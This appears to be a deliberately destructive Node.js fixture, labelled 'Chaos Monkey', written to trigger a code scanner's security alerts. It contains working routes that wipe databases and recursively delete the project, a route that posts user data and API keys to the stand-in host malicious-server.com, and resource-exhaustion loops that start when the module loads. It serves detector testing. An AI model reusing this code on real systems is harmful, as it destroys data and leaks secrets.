// CHAOS MONKEY - Intentionally destructive code that violates ALL architectural principles
// This file is designed to trigger ArcVision's highest security alerts

const fs = require('fs');
const path = require('path');
const express = require('express');
const mysql = require('mysql2/promise');
const mongoose = require('mongoose');
const axios = require('axios');
const React = require('react');

// VIOLATION 1: Global mutable state - the worst practice
let GLOBAL_DATABASE_CONNECTION = null;
let USER_SESSIONS = new Map();
let CONFIGURATION = {};

// VIOLATION 2: Hardcoded credentials and secrets
const DB_CONFIG = {
  host: 'localhost',
  user: 'root',
  password: 'admin123', // NEVER do this in production!
  database: 'production_db'
};

const API_KEYS = {
  aws: 'AKIAIOSFODNN7EXAMPLE',
  google: 'AIzaSyBexamplekey123',
  stripe: 'sk_test_1234567890abcdef'
};

// VIOLATION 3: Mixing ALL architectural layers in one file
class ChaosMonkey {
  constructor() {
    this.app = express();
    this.setupDatabase();
    this.setupRoutes();
    this.setupChaos();
  }

  // VIOLATION 4: Synchronous database operations in async context
  setupDatabase() {
    // Mixed database connections - MySQL and MongoDB in same service
    this.mysqlConnection = mysql.createConnection(DB_CONFIG);
    
    mongoose.connect('mongodb://localhost:27017/chaos_db', {
      useNewUrlParser: true,
      useUnifiedTopology: true
    });
  }

  // VIOLATION 5: Routes that do EVERYTHING - business logic, data access, presentation
  setupRoutes() {
    // Route that deletes everything
    this.app.delete('/api/nuke', async (req, res) => {
      try {
        // Delete all users from MySQL
        await this.mysqlConnection.execute('DELETE FROM users');
        
        // Drop entire MongoDB database
        await mongoose.connection.db.dropDatabase();
        
        // Delete all files in project
        this.recursiveDelete('./');
        
        res.json({ message: 'Everything has been destroyed!' });
      } catch (error) {
        res.status(500).json({ error: error.message });
      }
    });

    // Route that steals all data
    this.app.get('/api/steal-data', async (req, res) => {
      try {
        // Extract all user data
        const [users] = await this.mysqlConnection.execute('SELECT * FROM users');
        const mongoData = await mongoose.connection.db.collection('sensitive_data').find({}).toArray();
        
        // Send to external service
        await axios.post('http://malicious-server.com/collect', {
          mysqlData: users,
          mongoData: mongoData,
          apiKeys: API_KEYS
        });
        
        res.json({ message: 'Data exfiltrated successfully' });
      } catch (error) {
        res.status(500).json({ error: error.message });
      }
    });

    // Route that creates circular dependencies
    this.app.post('/api/circular-hell', (req, res) => {
      const self = this;
      
      // Circular reference that will cause memory leaks
      function a() { return b(); }
      function b() { return c(); }
      function c() { return a(); } // Infinite loop!
      
      // Force the circular call
      setTimeout(() => {
        a();
      }, 1000);
      
      res.json({ message: 'Circular dependency activated' });
    });
  }

  // VIOLATION 6: Destructive file operations
  recursiveDelete(directory) {
    const files = fs.readdirSync(directory);
    for (const file of files) {
      const filePath = path.join(directory, file);
      const stat = fs.statSync(filePath);
      
      if (stat.isDirectory()) {
        this.recursiveDelete(filePath);
        fs.rmdirSync(filePath);
      } else {
        fs.unlinkSync(filePath);
      }
    }
  }

  // VIOLATION 7: Resource exhaustion attacks
  setupChaos() {
    // Memory leak creator
    setInterval(() => {
      const leak = new Array(1000000).fill('memory leak attack');
      GLOBAL_DATABASE_CONNECTION = leak; // Store in global variable
    }, 1000);

    // CPU intensive operations
    setInterval(() => {
      let result = 0;
      for (let i = 0; i < 1000000000; i++) {
        result += Math.sqrt(i);
      }
    }, 500);

    // Network flooding
    setInterval(async () => {
      try {
        await axios.get('http://httpbin.org/delay/10'); // 10 second delay
      } catch (error) {
        // Ignore errors, keep flooding
      }
    }, 100);
  }

  // VIOLATION 8: Unhandled promises and resource leaks
  async dangerousOperation() {
    const connection = await mysql.createConnection(DB_CONFIG);
    // Never close the connection - resource leak!
    
    const [rows] = await connection.execute('SELECT * FROM users');
    return rows;
  }

  start(port = 3000) {
    this.app.listen(port, () => {
      console.log(`CHAOS MONKEY LISTENING ON PORT ${port}`);
      console.log('WARNING: This service will destroy your system!');
    });
  }
}

// VIOLATION 9: Immediate execution on module load
const chaos = new ChaosMonkey();
chaos.start(3000);

// VIOLATION 10: Global scope pollution
global.CHAOS_MONKEY = chaos;
global.DESTRUCTIVE_CODE = true;

module.exports = ChaosMonkey;